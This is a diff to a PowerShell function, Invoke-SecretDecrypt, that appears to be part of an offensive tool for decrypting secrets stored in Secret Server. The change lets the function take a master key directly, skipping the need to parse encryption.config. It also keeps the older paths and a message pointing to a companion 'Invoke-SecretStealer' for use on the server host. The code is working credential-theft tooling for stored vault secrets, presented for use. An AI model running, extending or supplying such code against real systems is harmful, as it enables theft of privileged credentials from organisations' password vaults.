@@ -29,7 +29,7 @@ Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 999
 #>
 
     Param (
-        [Parameter( Position = 0, Mandatory = $True )]
+        [Parameter( Position = 0, Mandatory = $False )]
         [String]
         $EncryptionConfig,
 
@@ -49,28 +49,39 @@ Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 999
         [String]
         $IVMek,
 
-        [switch]$NewFormat = $false
+        [Parameter( Mandatory = $False )]
+        [String]
+        $MasterKey,
+
+        [switch]$NewFormat = $False
     )
 
-    if($NewFormat){
-        $masterKeys = Get-MasterKeysv104($EncryptionConfig)
-        if(-not $masterKeys){
-            Write-Host "Failed to decrypt encryption.config"
-            return
-        }
+    if($MasterKey){
+        $key256 = Convert-HexStringToByteArray($MasterKey)
     }
-    else{
-        loadDeserializer
-        $masterKeys = Get-MasterKeys($EncryptionConfig)
-        if(-not $masterKeys){
-            Write-Host "Failed to decrypt encryption.config, may be using the new format. Try adding -NewFormat flag"
-            return
+    else {
+        if($NewFormat){
+            $masterKeys = Get-MasterKeysv104($EncryptionConfig)
+            if(-not $masterKeys){
+                Write-Host "Failed to decrypt encryption.config"
+                return
+            }
         }
-    }
+        else{
+            loadDeserializer
+            $masterKeys = Get-MasterKeys($EncryptionConfig)
+            if(-not $masterKeys){
+                Write-Host "Failed to decrypt encryption.config, may be using the new format. Try adding -NewFormat flag"
+                return
+            }
+        }
 
-    if($masterKeys.IsEncryptedWithDPAPI){ 
-        Write-Host "Secret Server configuration uses DPAPI. Use Invoke-SecretStealer on the Secret Server host."
-        return
+        if($masterKeys.IsEncryptedWithDPAPI){ 
+            Write-Host "Secret Server configuration uses DPAPI. Use Invoke-SecretStealer on the Secret Server host."
+            return
+        }
+
+        $key256 = Convert-HexStringToByteArray($masterKeys.key256);
     }
 
     $IVMekBytes = Convert-HexStringToByteArray($IVMek);
@@ -79,7 +90,6 @@ Invoke-SecretDecrypt -EncryptionConfig C:\Users\user\encryption.config -Item 999
     $ItemBytes = Convert-HexStringToByteArray $Item
 
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-    $key256 = Convert-HexStringToByteArray($masterKeys.key256);
     $cryptoTransform = $aes.CreateDecryptor($key256, $IVMekBytes)
     $intermediateKey = $cryptoTransform.TransformFinalBlock($KeyBytes, 0, $KeyBytes.Length)
     
